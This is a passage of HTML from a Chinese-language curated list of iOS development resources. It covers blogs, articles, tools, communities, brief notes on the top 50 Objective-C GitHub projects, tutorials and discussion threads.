  <td>王轲, IndieBros Studio 创始人, 优秀的 iOS 开发工程师, 写的文章深入浅出, 很多问题分析透彻, 非常有条理性</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.jianshu.com/p/99e8b3f6f377"">叶孤城</a></td>
  <td>叶孤城, 优秀 iOS 开发工程师, 发表的文章都有很多干货, 对源码解析类文章写得浅显易懂, 并时常总结一些 iOS 开发技巧, 值得一读</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://zhowkev.in"">Kevin Blog</a></td>
  <td>周楷雯, 秒视创始人, 知名 iOS 工程师, 做出了 <a rel=""nofollow"" href=""https://github.com/kevinzhow/PNChart"">PNChart</a> 和 <a rel=""nofollow"" href=""https://github.com/kevinzhow/Waver"">Waver</a> 这样的好项目, 在博客中也有谈到具体的实现过程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://imtx.me"">IMTX</a></td>
  <td>图拉鼎, 知名 Apple 平台开发者, 曾经的 Ubuntu 平台开发者, 文章有不少干货, 大多讲解技术实现和学习经验</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/tangqiaoboy/iOSBlogCN"">更多</a></td>
  <td>唐巧收集的中文 iOS/Mac 开发博客列表, 更新频繁, 值得收藏</td>
</tr>
</tbody>
</table>
<h2>文章</h2>

<table>
<thead><tr>
<th>标题</th>
  <th>内容简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""https://www.udemy.com/blog/learn-objective-c"">Learn Objective C: The Path to iPhone Development</a></td>
  <td>Udemy 写的文章, 说明了一些学习 Objective-C 的前提条件, Objective-C 的发展历史, 学习方法以及学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://lifehacker.com/i-want-to-write-ios-apps-where-do-i-start-1644802175"">I Want to Write iOS Apps. Where Do I Start?</a></td>
  <td>主要对 iOS 的开发环境进行了介绍, 并且涉及到了 Swift 的学习, iOS 上架的注意事项, iOS 的设计, 测试, 代码托管等, 讲解较为广泛, 同时也给出不少学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://roadfiresoftware.com/2014/04/how-to-become-a-professional-ios-developer"">How to become a professional iOS developer</a></td>
  <td>文章写的很有条理, 文中多次强调了版本控制系统的重要性, 主要内容是对学习 iOS 开发到就职, 给出了自己的建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://codewithchris.com/learning-ios-programming"">Learning iOS Programming</a></td>
  <td>作者总结了一些自己学习 iOS 的血的教训, 最后给出了一些不错学习建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://www.udacity.com/career-paths/ios-developer"">Become an iOS Developer</a></td>
  <td>作者列举了一些学习 iOS 的方法以及常用的库, 以及自学 iOS 的一些建议</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.devtang.com/blog/2014/07/27/ios-levelup-tips"">iOS开发如何提高</a></td>
  <td>唐巧写的一篇文章, 主要是对 iOS 技术的提高做的一个总结, 文中不少资源, 工具, 学习方法</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://limboy.me/ios/2014/12/31/learning-ios.html"">自学 iOS 开发的一些经验</a></td>
  <td>文章从入门到进阶到高级, 分为三个阶段, 有条理的讲出了 iOS 的整个学习过程中开发者可能遇到的问题, 并给出了解决办法, 奉献了不少好工具, 资源还有珍贵的学习经验</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://readful.com/post/101914515826/0-ios"">如何从 0 开始学 iOS 开发</a></td>
  <td>作者给出了学习 iOS 的流程, 并给出一些不错的学习资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com/programmer/20141128/10353.html"">如果我可以重新学习iOS开发</a></td>
  <td>作者在文中给出了学习的一些建议, 也谈到了自己的学习方法</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com/ios/20141106/10147.html"">iOS开发学习路径的一些建议</a></td>
  <td>文中谈到了英语的重要性, 以及写博客, 看源代码的好处</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.jianshu.com/p/KSuDqb"">iOS 开发入门</a></td>
  <td>作者分享了自己学习 iOS 的经验和资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://beyondvincent.com/blog/2013/07/18/106"">Mac 和 iOS 开发资源汇总</a></td>
  <td>破船之家发布的资源汇总</td>
</tr>
</tbody>
</table>
<h2>相关网站</h2>

<table>
<thead><tr>
<th>网站</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://tutsplus.com/tutorials/search?utf8=%E2%9C%93&amp;search%5Btopic%5D=&amp;search%5Bterms%5D=ios&amp;button="">tutsplus</a></td>
  <td>不定时更新一些 iOS 教程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/videos"">WWDC</a></td>
  <td>苹果官方每年一度的 WWDC 视频, 可以了解历年有关 iOS 发布的内容</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://asciiwwdc.com"">ASCIIwwdc</a></td>
  <td>WWDC 的文字版</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://swift.zeef.com/robin.eggenkamp"">Awesome Swift</a></td>
  <td>该网站收集了很多关于 Swift 的学习资料, 新闻</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.appcoda.com"">Appcoda</a></td>
  <td>经常发布一些 iOS 编程教程, 更新比较频繁, 想了解更多可以查看该网站的 About 界面</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://nshipster.com"">NSHipster</a></td>
  <td>NSHipster is a journal of the overlooked bits in Objective-C, Swift, and Cocoa. Updated weekly.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.thinkandbuild.it"">Think and Build</a></td>
  <td>Some tutorials about Core Graphic and Core Animation.</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.raywenderlich.com/tutorials"">Tutorials</a></td>
  <td>大把的 Objective-C, Swift, iOS 教程, 且全部免费, Raywenderlich 真是业界良心, 赞!</td>
</tr>
</tbody>
</table>
<h2>社区</h2>

<table>
<thead><tr>
<th>社区</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://www.cocoachina.com"">CocoaChina</a></td>
  <td>全球最大苹果开发者中文社区</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://code4app.com"">code4app</a></td>
  <td>经常更新一些很不错的 iOS 代码片段和一些 iOS 资源</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.objc.io"">objc</a></td>
  <td>定期发布一些有关 Objective-C 的高质量的文章</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://objccn.io"">objc中国</a></td>
  <td>喵神组织的对 objc.io 的翻译网站, 旨在推进国内技术圈整体水平, 翻译质量非常高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.devdiv.com"">DevDiv</a></td>
  <td>发布一些 iOS 的最新资讯及教程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://discuss.cocos2d-x.org"">Cocos2d-x</a></td>
  <td>Cocos2d-x 论坛</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://iphonedevsdk.com"">iPhone Dev SDK</a></td>
  <td>国外较有名的 iOS 开发者论坛</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://forum.learncocoa.org"">Learn Cocoa and iOS Development Forum</a></td>
  <td>
<a rel=""nofollow"" href=""http://www.amazon.com/Learn-Cocoa-Mac-Jack-Nutting/dp/1430245425"">Learn Cocoa on the Mac</a> 和 <a rel=""nofollow"" href=""http://www.amazon.com/Beginning-iOS-Development-Exploring-SDK/dp/143026022X"">Beginning iOS 7 Development</a> 这两本书籍的官方论坛, 用户活跃度较高</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://devforums.apple.com"">Apple Developer Forums</a></td>
  <td>苹果官方的开发者论坛</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.swiftist.org"">Swiftist</a></td>
  <td>Swift 中文社区</td>
</tr>
</tbody>
</table>
<h2>工具/插件</h2>

<table>
<thead><tr>
<th>工具/插件</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""http://cocoapods.org"">CocoaPods</a></td>
  <td>开发 OS X 和 iOS 应用程序的一个第三方库的依赖管理工具, 本身是 Ruby 的一个 gem, 极大的简化了 Objective-C 的开发流程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://alcatraz.io"">Alcatraz</a></td>
  <td>Alcatraz 是一款管理 Xcode 插件、模版以及颜色配置的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/robbiehanson/XcodeColors"">XcodeColors</a></td>
  <td>使 Xcode 调试控制台色彩更丰富</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/facebook/xctool"">xctool</a></td>
  <td>Facebook 开源的一个 iOS 编译和测试的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/trawor/XToDo"">XToDo</a></td>
  <td>一款注释辅助插件，主要用于收集并列出项目中的<code>TODO</code>, <code>FIXME</code>, <code>???</code>, <code>!!!</code>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/ksuther/KSImageNamed-Xcode"">KSImageNamed-Xcode</a></td>
  <td>自动补全图片命名的一款插件</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://github.com/onevcat/VVDocumenter-Xcode"">VVDocumenter</a></td>
  <td>一个自动生成代码注释的工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://imageoptim.com"">ImageOptim</a></td>
  <td>用于压缩图片一款工具</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://benscheirman.com/2013/08/the-ios-developers-toolbelt"">iOS 必备的 75 个工具</a></td>
  <td>其中包含了非常多好用的工具, 涉及到设计, 分析, 部署等, 总结的十分详细, 有<a rel=""nofollow"" href=""http://blog.jobbole.com/46799"">中文翻译</a>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.devtang.com/blog/2014/06/29/ios-dev-tools"">更多</a></td>
  <td>唐巧总结的一些图形应用工具, 命令行工具, Xcode 插件, 并介绍了一点基础的用法</td>
</tr>
</tbody>
</table>
<h2>GitHub Top 50 简介</h2>

<p>主要对当前 GitHub 排名前 50 的项目做一个简单的简介, 方便初学者快速了解到当前 Objective-C 在 GitHub 的情况.</p>

<table>
<thead><tr>
<th>项目名称</th>
  <th>项目信息</th>
</tr></thead>
<tbody>
<tr>
<td>1. <a rel=""nofollow"" href=""https://github.com/AFNetworking/AFNetworking"">AFNetworking</a>
</td>
  <td>作者是 NSHipster 的博主, iOS 开发界的大神级人物, 毕业于卡内基·梅隆大学, 开源了许多牛逼的项目, 这个便是其中之一, AFNetworking 采用 NSURLConnection + NSOperation, 主要方便与服务端 API 进行数据交换, 操作简单, 功能强大, 现在许多人都用它取代 ASIHTTPRequest</td>
</tr>
<tr>
<td>2. <a rel=""nofollow"" href=""https://github.com/BradLarson/GPUImage"">GPUImage</a>
</td>
  <td>一款强大的图片滤镜工具, 支持自定义滤镜, 可用来实时处理图片和视频流, 作者是 SonoPlot 公司的 CTO, 在很小的时候便开始接触编程, 他在 <a rel=""nofollow"" href=""http://stackoverflow.com/users/19679/brad-larson"">SO</a> 上面的回答也有很多值得阅读, GPUImage 这个项目从 2012 年开始, 使用 OpenGL 图形程序接口编写, 性能非常好, 现在很多 iOS 程序员都用它来实现 iOS 的模糊效果</td>
</tr>
<tr>
<td>3. <a rel=""nofollow"" href=""https://github.com/facebookarchive/three20"">three20</a>
</td>
  <td>由 Facebook iOS 客户端衍生出的一款 iPhone 框架, 内置许多丰富的功能, 有丰富的界面, 对底层的操作便捷, 为开发者省下了很多时间, 但现在已经停止了更新, 一个 <a rel=""nofollow"" href=""https://github.com/facebookarchive/three20/pull/832?utm_source=iOS+Dev+Weekly&amp;utm_campaign=46a7deb647-iOS_Dev_Weekly_Issue_100&amp;utm_medium=email&amp;utm_term=0_7bda94b7ca-46a7deb647-299428269"">PR</a> 把代码删得干干净净, 不要好奇去点开 Files changed, 我点开后该页面直接卡死, three20 当中的一位作者创建了 <a rel=""nofollow"" href=""https://github.com/jverkoey/nimbus"">Nimbus</a>, 算是 three20 的一个替代品</td>
</tr>
<tr>
<td>4. <a rel=""nofollow"" href=""https://github.com/RestKit/RestKit"">RestKit</a>
</td>
  <td>主要用于 iOS 上网络通信, 允许与 RESTful Web 服务交互, 常用于处理 API, 解析 JSON, 映射响应对象等操作, 简单易用, 方便你把所有精力都放在对数据的操作上</td>
</tr>
<tr>
<td>5. <a rel=""nofollow"" href=""https://github.com/rs/SDWebImage"">SDWebImage</a>
</td>
  <td>作者 Olivier Poitrey 是 Dailymotion 的 CTO, 拥有多个不错的开源项目, 此项目常用于对从 Web 端接受到的图片进行缓存, 是 UIImageView 的扩展, 应用起来比较简单</td>
</tr>
<tr>
<td>6. <a rel=""nofollow"" href=""https://github.com/ReactiveCocoa/ReactiveCocoa"">ReactiveCocoa</a>
</td>
  <td>由 GitHub 工程师们开发的一个应用于 iOS 和 OS X 开发的函数响应式编程新框架, Matt 称其为 ""An open source project that exemplifies this brave new era for Objective-C"", 也有人说它是 Cocoa 的未来, 具体可看唐巧写的这篇<a rel=""nofollow"" href=""http://blog.devtang.com/blog/2014/02/11/reactivecocoa-introduction"">文章</a>
</td>
</tr>
<tr>
<td>7. <a rel=""nofollow"" href=""https://github.com/jdg/MBProgressHUD"">MBProgressHUD</a>
</td>
  <td>作者 Matej Bukovinski 是一位全栈工程师, UI/UX 设计师,  此项目是一款提示框第三方库, 帮助开发者快速应用到项目中)</td>
</tr>
<tr>
<td>8. <a rel=""nofollow"" href=""https://github.com/magicalpanda/MagicalRecord"">MagicalRecord</a>
</td>
  <td>作者是 Coursera 的 iOS 工程师, 该项目创作灵感来自于 Ruby on Rails 的 Active Record, 主要为方便操作 CoreData 而生, 帮助清除 CoreData 引用的代码, 协助方便 CoreData 的工作</td>
</tr>
<tr>
<td>9. <a rel=""nofollow"" href=""https://github.com/ccgus/fmdb"">FMDB</a>
</td>
  <td>一个对 SQLite 进行封装的库, 使用起来方便, 简单</td>
</tr>
<tr>
<td>10. <a rel=""nofollow"" href=""https://github.com/pokeb/asi-http-request"">ASIHTTPRequest</a>
</td>
  <td>一个轻量级的 iOS 网络通信类库, 基于 CFNetwork 框架开发, 但现在已经停止更新, 多数开发者改用 AFNetworking 替代)</td>
</tr>
<tr>
<td>11. <a rel=""nofollow"" href=""https://github.com/Mantle/Mantle"">Mantle</a>
</td>
  <td>作者是 GitHub 的员工, 文档写的很清楚: Mantle makes it easy to write a simple model layer for your Cocoa or Cocoa Touch application, 主要用来将 JSON 数据模型化为 Model 对象, 唱吧在前段时间也改用 Mantle 了.</td>
</tr>
<tr>
<td>12. <a rel=""nofollow"" href=""https://github.com/Grouper/FlatUIKit"">FlatUIKit</a>
</td>
  <td>收集了很多扁平化 UI 的 iOS 组件, 方便使用</td>
</tr>
<tr>
<td>13. <a rel=""nofollow"" href=""https://github.com/facebook/facebook-ios-sdk"">Facebook SDK for iOS</a>
</td>
  <td>Facebook 官方的 iOS SDK, 方便开发者集成 Facebook 的一些功能到自己的 iOS APP 里面</td>
</tr>
<tr>
<td>14. <a rel=""nofollow"" href=""https://github.com/johnezang/JSONKit"">JSONKit</a>
</td>
  <td>主要用于解析 JSON, 适用于 iOS6 以下环境, 自从 iOS5 开始 Apple 官方给出了 NSJSONSerialization API, 自此大家都用官方的了</td>
</tr>
<tr>
<td>15. <a rel=""nofollow"" href=""https://github.com/jigish/slate"">Slate</a>
</td>
  <td>一款窗口管理应用程序, 但在两年前就已经停止更新了</td>
</tr>
<tr>
<td>16. <a rel=""nofollow"" href=""https://github.com/jverkoey/nimbus"">Nimbus</a>
</td>
  <td>作者 Jeff 曾为 Facebook, Google 做过不少好东西, 也是 three20 的成员之一, three20 停更后, 他创造出这个框架来代替 three20, 文档齐全</td>
</tr>
<tr>
<td>17. <a rel=""nofollow"" href=""https://github.com/path/FastImageCache"">FastImageCache</a>
</td>
  <td>Path 公司出品的 iOS 库, 作者 Mallory Paine 是苹果前员工, 此类库适用于在滚动时快速显示图像, 高速持久是其最大的特点</td>
</tr>
<tr>
<td>18. <a rel=""nofollow"" href=""https://github.com/TransitApp/SVProgressHUD"">SVProgressHUD</a>
</td>
  <td>又一款轻量级的 iOS 第三方控件, 用于显示任务加载时的动画, 非常轻便, 容易使用</td>
</tr>
<tr>
<td>19. <a rel=""nofollow"" href=""https://github.com/facebook/Shimmer"">Shimmer</a>
</td>
  <td>Facebook 推出的一款具有闪烁效果的第三方控件, 供它旗下一款名为 Paper 的应用使用, 安装使用整个过程都十分简单</td>
</tr>
<tr>
<td>20. <a rel=""nofollow"" href=""https://github.com/CocoaLumberjack/CocoaLumberjack"">CocoaLumberjack</a>
</td>
  <td>这是 Mac 和 iOS 的一款强大的日志框架, 配置简单, 多线程, 提供更高级的 log 功能, 可用于代替默认的 NSLog 语句</td>
</tr>
<tr>
<td>21. <a rel=""nofollow"" href=""https://github.com/Inferis/ViewDeck"">ViewDeck</a>
</td>
  <td>一款开源的 iOS 活动面板组件, 还原 Path 2.0 的侧滑效果, 作者因为时间关系在两年前停止对其更新</td>
</tr>
<tr>
<td>22. <a rel=""nofollow"" href=""https://github.com/supermarin/Alcatraz"">Alcatraz</a>
</td>
  <td>Alcatraz 是一款管理 Xcode 插件、模版以及颜色配置的工具, 可以集成到 Xcode 的图形界面中, 安装删除都是几条命令的事, 很方便, 支持自己开发插件并上传</td>
</tr>
<tr>
<td>23. <a rel=""nofollow"" href=""https://github.com/OpenEmu/OpenEmu"">OpenEmu</a>
</td>
  <td>超强的游戏模拟器, 做游戏开发必备, 官网做得也很不错</td>
</tr>
<tr>
<td>24. <a rel=""nofollow"" href=""https://github.com/facebook/AsyncDisplayKit"">AsyncDisplayKit</a>
</td>
  <td>Facebook 开源的一款 iOS UI 框架, Paper 用的就是该框架, 另外框架还用到了 Facebook 早期开源 Pop 动画引擎</td>
</tr>
<tr>
<td>25. <a rel=""nofollow"" href=""https://github.com/facebook/xctool"">Xctool</a>
</td>
  <td>是 Facebook 开源的一个命令行工具，用来替代苹果的 XcodeBuild 工具, 极大的方便了 iOS 的构建和测试, 输出错误信息也比较友好, 受到许多 iOS 开发者的称赞, 经常与其搭配使用的还有 OCUnit, <a rel=""nofollow"" href=""https://travis-ci.org"">Travis CI</a>, <a rel=""nofollow"" href=""http://oclint.org"">OCLint</a> 等测试工具</td>
</tr>
<tr>
<td>26. <a rel=""nofollow"" href=""https://github.com/nicklockwood/iCarousel"">iCarousel</a>
</td>
  <td>作者是英国 Charcoal Design 公司的创始人, 开源领域的贡献颇为卓著, 这个项目就是其中之一, 这是一款可以在 iOS 上实现旋转木马视图切换效果的第三方控件, 并提供多种切换效果</td>
</tr>
<tr>
<td>27. <a rel=""nofollow"" href=""https://github.com/Flipboard/FLEX"">FLEX</a>
</td>
  <td>这是 Flipboard 官方发布的一组专门用于 iOS 开发的应用内调试工具, 开发者无需将其连接到 LLDB/Xcode 或其他远程调试服务器,支持直接在 App 中运行</td>
</tr>
<tr>
<td>28. <a rel=""nofollow"" href=""https://github.com/cocos2d/cocos2d-swift"">Cocos2D Swift</a>
</td>
  <td>这是 Swift 语言版本的 Cocos2D 游戏开发引擎, 核心开发者是 Ricardo Quesada, 已经为该项目贡献了 100W 行左右代码, GitHub 上更新较为频繁</td>
</tr>
<tr>
<td>29. <a rel=""nofollow"" href=""https://github.com/devinross/tapkulibrary"">TapkuLibrary</a>
</td>
  <td>作者是 Devin Ross, 这是在 iOS 上一款功能强大的 UI 效果类库, 可以实现多种酷炫的效果, 目前仍在更新中</td>
</tr>
<tr>
<td>30. <a rel=""nofollow"" href=""https://github.com/Masonry/Masonry"">Masonry</a>
</td>
  <td>一个轻量级的布局框架, 同时支持 iOS 和 Mac OS X, 语法优雅, 帮助开发者快速适配不同分辨率的 iOS 设备</td>
</tr>
<tr>
<td>31. <a rel=""nofollow"" href=""https://github.com/levey/AwesomeMenu"">AwesomeMenu</a>
</td>
  <td>作者是一位中国人, 该项目主要是使用 CoreAnimation 还原了 Path menu 的动画效果</td>
</tr>
<tr>
<td>32. <a rel=""nofollow"" href=""https://github.com/square/PonyDebugger"">PonyDebugger</a>
</td>
  <td>由 Square 公司推出的一款优秀的 iOS 应用网络调试工具, 用户可以实时看到应用程序的网络请求, 也可以对 iOS 应用程序的核心数据栈进行远程调试</td>
</tr>
<tr>
<td>33. <a rel=""nofollow"" href=""https://github.com/samuelclay/NewsBlur"">NewsBlur</a>
</td>
  <td>作者独自一个人 Samuel Clay 做出来的一款名为 NewsBlur 的新闻阅读器, 很多人都称其为 Google Reader 的替代品, 这是它的源码</td>
</tr>
<tr>
<td>34. <a rel=""nofollow"" href=""https://github.com/jverdi/JVFloatLabeledTextField"">JVFloatLabeledTextField</a>
</td>
  <td>作者是 Thumb Labs 的联合创始人, JVFloatLabeledTextField 是 UITextField 的子类, 主要实现输入框标签浮动效果, 创作灵感来自 Dribbble, 已出现多个移植版本</td>
</tr>
<tr>
<td>35. <a rel=""nofollow"" href=""https://github.com/stig/json-framework"">Json Framework</a>
</td>
  <td>用于解析 JSON 数据的一个框架, 但是在 iOS5 以上版本大多数人都选择使用 NSJSONSerialization 来解析 JSON, 该项目现在在 GitHub 上也几乎没怎么更新了</td>
</tr>
<tr>
<td>36. <a rel=""nofollow"" href=""https://github.com/google/physical-web"">The Physical Web</a>
</td>
  <td>由 Chrome 团队主导的一个项目, 意在用 URL 连接世界, 方便用户接受数据, 目前尚处在实验阶段</td>
</tr>
<tr>
<td>37. <a rel=""nofollow"" href=""https://github.com/tonymillion/Reachability"">Reachability</a>
</td>
  <td>Reachablity 是用于检测 iOS 设备网络环境的库</td>
</tr>
<tr>
<td>38. <a rel=""nofollow"" href=""https://github.com/romaonthego/RESideMenu"">RESideMenu</a>
</td>
  <td>作者 Roman Efimov 是雅虎的 iOS 工程师, 这个项目实现了 iOS 上的菜单侧滑效果, 创意来源于 dribbble, 该项目支持 iOS8</td>
</tr>
<tr>
<td>39. <a rel=""nofollow"" href=""https://github.com/robbiehanson/CocoaAsyncSocket"">CocoaAsyncSocket</a>
</td>
  <td>一个功能强大、简单易用的异步 socket 通讯类库, 支持 TCP 和 UDP 协议, 可用于 Mac 和 iOS 设备上, 作者 Robbie Hanson 是 Deusty 的首席软件工程师</td>
</tr>
<tr>
<td>40. <a rel=""nofollow"" href=""https://github.com/ECSlidingViewController/ECSlidingViewController"">ECSlidingViewController</a>
</td>
  <td>一个视图控制器容器, 将子视图处理成两层, 通过滑动来处理层的切换, 创作灵感来自 Facebook 和 Path的 APP, 作者是 Cleveland 的员工</td>
</tr>
<tr>
<td>41. <a rel=""nofollow"" href=""https://github.com/CEWendel/SWTableViewCell"">SWTableViewCell</a>
</td>
  <td>UITableViewCell 的子类, 实现了左右滑动显示信息视图并调出按钮</td>
</tr>
<tr>
<td>42. <a rel=""nofollow"" href=""https://github.com/TTTAttributedLabel/TTTAttributedLabel"">TTTAttributedLabel</a>
</td>
  <td>UILabel 的替代品, 使 iOS 上的 Label 功能更加丰富, 可支持链接植入等功能</td>
</tr>
<tr>
<td>43. <a rel=""nofollow"" href=""https://github.com/CanvasPod/Canvas"">Canvas</a>
</td>
  <td>无需编码实现牛逼的动画效果的库, 连设计师都可以快速上手</td>
</tr>
<tr>
<td>44. <a rel=""nofollow"" href=""https://github.com/square/SocketRocket"">SocketRocket</a>
</td>
  <td>Square 公司开源的一个 WebSocket 客户端, 稳定并且易用, 做实时应用常会用到, 受广大开发者喜爱</td>
</tr>
<tr>
<td>45. <a rel=""nofollow"" href=""https://github.com/facebook/Tweaks"">Tweaks</a>
</td>
  <td>Facebook 开源的一款工具, 旨在帮助 iOS 开发者更快的迭代应用, 方便用户动态的调整参数, 是的, Paper 这个项目也用到了</td>
</tr>
<tr>
<td>46. <a rel=""nofollow"" href=""https://github.com/jessesquires/JSQMessagesViewController"">JSQMessagesViewController</a>
</td>
  <td>优雅的 iOS 消息类库, 常用于聊天应用中, 可定制性高</td>
</tr>
<tr>
<td>47. <a rel=""nofollow"" href=""https://github.com/kevinzhow/PNChart"">PNChart</a>
</td>
  <td>作者周楷雯是 90 后, 秒视的创始人, 该项目是一个带动画效果的图表控件, 简约易用, 受到不少开发者喜爱</td>
</tr>
<tr>
<td>48. <a rel=""nofollow"" href=""https://github.com/onevcat/VVDocumenter-Xcode"">VVDocumenter-Xcode</a>
</td>
  <td>作者是王巍国内著名的 iOS 开发者, 人称喵神, 目前在日本 LINE 公司工作, 该项目帮助开发者轻松的生成注释文档, 节省了不少工作量, 赞</td>
</tr>
<tr>
<td>49. <a rel=""nofollow"" href=""https://github.com/arashpayan/appirater"">Appirater</a>
</td>
  <td>一款用于提醒用户给你的 APP 打分的工具</td>
</tr>
<tr>
<td>50. <a rel=""nofollow"" href=""https://github.com/zwaldowski/BlocksKit"">BlocksKit</a>
</td>
  <td>一个开源的与 Cocoa 紧密集合的基础性框架</td>
</tr>
</tbody>
</table>
<h2>邮件订阅</h2>

<ul>
<li>
<a rel=""nofollow"" href=""http://iosdevweekly.com"">iOS Dev Weekly</a> (每周一期，内容多为这一星期里值得关注的 GitHub 项目、文章、工具等)</li>
<li>
<a rel=""nofollow"" href=""http://iosdesign.co"">iOS Design Weekly</a> (Tips, news and inspiration delivered each week)</li>
</ul>
<h2>文档</h2>

<ul>
<li>
<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/navigation"">iOS Developer Library</a> (iOS 开发必看, 有此文档足矣, 内容非常之详细)</li>
</ul>
<h2>指南/教程</h2>

<table>
<thead><tr>
<th>网址</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/app-store/review/guidelines"">App Store Review Guidelines</a></td>
  <td>iOS 应用商店审核指南, 有<a rel=""nofollow"" href=""http://www.cocoachina.com/ios/20140227/7892.html"">中文翻译版</a>
</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://dev.swiftguide.cn"">Swift 语言指南</a></td>
  <td>有很多丰富的 Swift 学习资料, 学习 Swift 有这份资料可以省下很多力气</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://ourcoders.com/thread/show/117"">苹果 Xcode 帮助文档阅读指南</a></td>
  <td>Tinyfool 推出的一篇对于帮助新手阅读官方文档的指南</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/programs/ios/gettingstarted"">Get started with your iOS developer pragram</a></td>
  <td>苹果写的一篇入门指南, 粗略讲解了 iOS 程序从开发到上架的整个流程</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://blog.teamtreehouse.com/the-beginners-guide-to-objective-c-language-and-variables"">Teamtreehouse</a></td>
  <td>文章主要讲解 Objective-C 的一些语法, 文章内容有趣且通俗易懂</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://www.appdeveloperatlas.com"">A map for iOS development</a></td>
  <td>一张 iOS 开发地图, 做得很赞, 看完对 iOS 开发流程有一定的认知</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""https://developer.apple.com/library/ios/referencelibrary/GettingStarted/RoadMapiOS"">Start Developing iOS Apps Today</a></td>
  <td>苹果官方给出的 iOS 入门教程, 看过之后能够做一个 To-Do 小程序</td>
</tr>
<tr>
<td><a rel=""nofollow"" href=""http://rypress.com/tutorials/objective-c"">Ry’s Objective-C Tutorial</a></td>
  <td>讲解 Objective-C 的教程, 图文并茂, 适合新手阅读</td>
</tr>
</tbody>
</table>
<h2>Awesome 系列</h2>

<ul>
<li><a rel=""nofollow"" href=""https://github.com/vsouza/awesome-ios"">Awesome iOS</a></li>
<li><a rel=""nofollow"" href=""https://github.com/matteocrippa/awesome-swift"">Awesome-Swift(1)</a></li>
<li><a rel=""nofollow"" href=""https://github.com/Wolg/awesome-swift"">Awesome-Swift(2)</a></li>
</ul>
<h2>知乎上的讨论</h2>

<ul>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/20016551"">如何才能系统的学习 iOS 开发，理解一些规则和深层次的机制原理？</a></li>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/19627420"">没有 C 和 Objective-C 基础如何快速学习 iOS 开发？</a></li>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/20264108"">iOS 开发怎么入门?</a></li>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/20130048"">iOS 开发入门需要学习哪些知识，从一无所知到精通需要多长时间？</a></li>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/20919784"">12 岁如何入门 iOS 编程？</a></li>
<li><a rel=""nofollow"" href=""http://www.zhihu.com/question/22914651"">GitHub 上都有哪些值得关注学习的 iOS 开源项目？</a></li>
</ul>
<h2>Quora 上的讨论</h2>

<ul>
<li><a rel=""nofollow"" href=""http://www.quora.com/What-are-the-best-resources-to-learn-iOS-development"">What are the best resources to learn iOS development?</a></li>
<li><a rel=""nofollow"" href=""https://www.quora.com/What-are-the-best-new-resources-for-learning-iOS-development-in-2014"">What are the best new resources for learning iOS development in 2014?</a></li>
</ul>
<h2>贡献者</h2>

<p>点击<a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS/graphs/contributors"">该链接</a>查看该项目的所有贡献者</p>

<h2>License</h2>

<p>以上内容采用 <a rel=""nofollow"" href=""http://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh"">CC BY-NC-SA 3.0</a> 进行许可, 转载请注明出处, 版权归本人及所有贡献者所有</p>

<blockquote>
